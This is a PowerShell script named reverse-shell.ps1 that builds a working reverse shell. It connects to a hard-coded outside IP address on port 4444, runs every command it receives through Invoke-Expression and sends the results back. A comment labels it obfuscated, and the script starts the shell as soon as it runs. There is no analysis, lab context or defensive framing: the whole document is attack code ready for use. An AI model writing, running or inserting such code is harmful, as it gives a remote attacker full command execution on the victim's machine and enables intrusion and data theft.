# reverse-shell.ps1 - Reverse shell connection
function Start-ReverseShell {
    param(
        [string]$IPAddress = "197.52.52.180",
        [int]$Port = 4444
    )
    
    Write-Host "[+] Starting reverse shell to $IPAddress`:$Port" -ForegroundColor Yellow
    
    try {
        # Obfuscated reverse shell
        $tcpClient = "System.Net.Sockets.TCPClient"
        $client = New-Object $tcpClient($IPAddress, $Port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
        
        Write-Host "[+] Connection established, waiting for commands..." -ForegroundColor Green
        
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName "System.Text.ASCIIEncoding").GetString($bytes, 0, $i)
            $sendback = (Invoke-Expression $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    }
    catch {
        Write-Host "[-] Reverse shell failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Start the reverse shell
Start-ReverseShell
